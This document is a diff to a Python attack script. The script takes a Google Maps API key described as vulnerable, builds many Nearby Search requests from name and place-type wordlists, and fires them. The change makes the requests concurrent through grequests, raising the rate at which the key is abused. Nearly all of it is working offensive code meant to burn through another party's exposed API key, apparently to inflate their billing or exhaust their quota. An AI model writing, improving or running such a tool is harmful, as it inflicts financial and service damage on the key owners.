@@ -1,10 +1,12 @@
 #!/usr/bin/python3
-import requests, warnings, json, sys, os, random, colorama, calendar, time
+import grequests, warnings, json, sys, os, random, colorama, calendar, time
 from colorama import Fore
-requests.packages.urllib3.disable_warnings()
 colorama.init(autoreset=True)
 
-def generate_parameter():
+def exception_handler(request, exception):
+    print(Fore.RED + "Request Failed.")
+
+def get_parameter():
     keyword = open("datasets/names.txt","r")
     type = open("datasets/gmap_types.txt","r")
 
@@ -36,14 +38,18 @@ def do_attack():
     apikey = str(input("Enter Google Maps API Key that vulnerable to nearby search place: "))
     count = int(input("Enter packet count: "))
     print (Fore.GREEN + "[+] Sending Packets")
+    urls = list()
     for i in range(count):
-        url = generate_url(apikey, generate_parameter())
-        print(url)
-        response = requests.get(url, verify=False)
-        if response.text.find("errorMessage") < 0:
-            print(Fore.GREEN + f"[+] Packet sequence-{i+1} Succeed: No Error Message")
+        url = generate_url(apikey, get_parameter())
+        urls.append(url)
+
+    responses = (grequests.get(u) for u in urls)
+    result_map = grequests.map(responses, exception_handler=exception_handler)
+    for result in result_map:
+        if result.text.find("error_message") < 0:
+            print(Fore.GREEN + f"[+] Packet sequence-{result_map.index(result) + 1} Succeed: No Error Message")
         else:
-            print(Fore.RED + f"[-] Packet sequence-{i+1} Failed: Error Message Exist")
+            print(Fore.RED + f"[-] Packet sequence-{result_map.index(result) + 1} Failed: Error Message Exist")
 
 if __name__ == "__main__":
     do_attack()
